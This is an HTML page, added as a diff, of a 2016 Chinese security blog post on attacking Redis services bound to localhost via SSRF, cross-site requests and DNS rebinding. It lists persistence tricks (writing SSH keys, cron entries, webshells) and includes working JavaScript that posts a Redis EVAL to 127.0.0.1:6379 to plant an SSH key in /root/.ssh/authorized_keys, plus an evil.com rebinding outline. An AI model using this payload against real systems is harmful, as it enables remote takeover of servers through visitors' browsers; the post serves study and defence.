@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>Redis和SSRF - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="Redis和SSRF - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/751/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            
+        </div>
+        <h1>Redis和SSRF</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-07-20 17:57"><i class="iconfont icon-date"></i>2016-07-20 17:57</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <blockquote>
+  <p>你以为bind了127.0.0.1就安全了么？</p>
+</blockquote>
+
+<h2 id="本地写文件">本地写文件</h2>
+
+<p>这个爆出来很久了。原理就是利用Redis的数据持久化。设置持久化文件的名称和路径，然后在Redis中写入文件内容，给Redis发送持久化的命令，这样Redis就会将数据库的内容写入执行的文件了。详细参考 http://blog.nsfocus.net/redis-unauthorized-ssh-free-password-vulnerabilities-fixes/</p>
+
+<p>这个并不一定需要SSRF，如果Redis未授权访问的，那同样可以利用。</p>
+
+<p>利用点</p>
+
+<ul>
+  <li>写<code class="highlighter-rouge">$Home/.ssh/authorized_keys</code>，root用户就是<code class="highlighter-rouge">/root</code>，其他用户需要猜测或者遍历用户名。</li>
+  <li>写<code class="highlighter-rouge">/var/spool/cron</code>，然后crontab定期执行，因为Redis持久化的数据可能包含其他的数据，所以写入的文件可能有一些垃圾信息，但是crontab对格式要求比较松，避免先去<code class="highlighter-rouge">flushall </code> Redis。</li>
+  <li>写webshell，但是得已知路径</li>
+  <li>slave of <code class="highlighter-rouge">$IP</code> 主从模式利用</li>
+  <li>写<code class="highlighter-rouge">/etc/profile.d/</code>用户环境变量</li>
+  <li>AOF类型持久化，和RDB持久化类似，但是是纯文本的格式</li>
+</ul>
+
+<h2 id="redis中数据和web应用的结合">Redis中数据和web应用的结合</h2>
+
+<p>如果控制了Redis中的数据，很多时候和直接控制了数据库是一样的，可以有针对性的修改数据。参考 https://www.seebug.org/vuldb/ssvid-91879  在Redis中更改了全局变量的值，导致任意代码执行。里面有对gopher协议的利用，参考 https://blog.chaitin.com/gopher-attack-surfaces/</p>
+
+<h2 id="redis-lua-sandbox-escape">Redis Lua Sandbox Escape</h2>
+
+<p>详情见 http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/</p>
+
+<p>利用了Redis的Lua支持，但是Redis的Lua是有sandbox的，不能执行任意的代码，怎么去尝试绕过？</p>
+
+<p>https://gist.github.com/corsix/6575486 实现的了三个功能</p>
+
+<ul>
+  <li>读取<code class="highlighter-rouge">TValue</code>结构体中的值</li>
+  <li>读取任意内存地址上的8个字节，可以导致基地址泄露</li>
+  <li>任意内存地址写8个字节</li>
+</ul>
+
+<p>作者在多个系统和多个Redis上都测试通过，Redis已经修复这个问题 https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ</p>
+
+<h2 id="ssrf和csrf结合体-看网页也能被拿shell">SSRF和CSRF结合体 看网页也能被拿shell</h2>
+
+<p>今天看到老外发了一个脑洞，https://ericrafaloff.com/client-side-redis-attack-poc/ 使用ajax直接给Redis发送请求，也利用的是Redis的Lua支持，原文中的Demo被我修改为写入ssh公钥的，当然上面提到的其他攻击方法都可以使用。</p>
+
+<div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">keydir</span> <span class="o">=</span> <span class="s2">"/root/.ssh"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">cmd</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"POST"</span><span class="p">,</span> <span class="s2">"http://127.0.0.1:6379"</span><span class="p">);</span>
+<span class="nx">cmd</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'eval \''</span> <span class="o">+</span> <span class="s1">'redis.call(\"set\", \"hacked\", "\\r\\n\\nssh-rsa AAAAB... virusdefender@LiYangs-MacBook-Pro.local\\n\\n\\n\\n\"); redis.call(\"config\", \"set\", \"dir\", \"'</span> <span class="o">+</span> <span class="nx">keydir</span> <span class="o">+</span> <span class="s1">'/\"); redis.call(\"config\", \"set\", \"dbfilename\", \"authorized_keys\"); '</span> <span class="o">+</span> <span class="s1">'\' 0'</span> <span class="o">+</span> <span class="s2">"\r\n"</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">cmd</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"POST"</span><span class="p">,</span> <span class="s2">"http://127.0.0.1:6379"</span><span class="p">);</span>
+<span class="nx">cmd</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'save\r\n'</span><span class="p">);</span>
+</code></pre>
+</div>
+
+<p>在这里有一个最大的限制就是浏览器跨域请求的问题，根据 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS 
+ 简单请求是可以直接跨域发送的，但是无法收到响应，简单请求的定义如下</p>
+
+<blockquote>
+  <p>只使用 GET, HEAD 或者 POST 请求方法。如果使用 POST 向服务器端传送数据，则数据类型(Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain中的一种。</p>
+</blockquote>
+
+<p>这里符合条件，所以可以直接发送请求到Redis端口。当然，还可以利用DNS Rebinding来绕过同源策略。步骤如下</p>
+
+<ul>
+  <li>解析<code class="highlighter-rouge">evil.com</code>到正常ip，使用比较小的TTL</li>
+  <li>用户浏览页面，页面中setTimeout到100秒后发送一个ajax请求到<code class="highlighter-rouge">evil.com</code></li>
+  <li>解析<code class="highlighter-rouge">evil.com</code>到<code class="highlighter-rouge">127.0.0.1</code>，因为TTL很小，所以生效很快，而且浏览器也会重新发送DNS查询</li>
+  <li>100秒后，请求实际被发送到了<code class="highlighter-rouge">127.0.0.1</code></li>
+</ul>
+
+<h2 id="思考">思考</h2>
+<ul>
+  <li>还有那些服务像Redis一样是很好利用？</li>
+  <li>http://www.freebuf.com/articles/web/19622.html 还有哪些跨协议攻击？</li>
+</ul>
+
+<h2 id="update">Update</h2>
+
+<p>后续 redis 3.2.6 版本加强了判断，将 Host 和 Post 两个单词当做了结束指令。</p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=Redis和SSRF&article_id=/index.php/archives/751/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
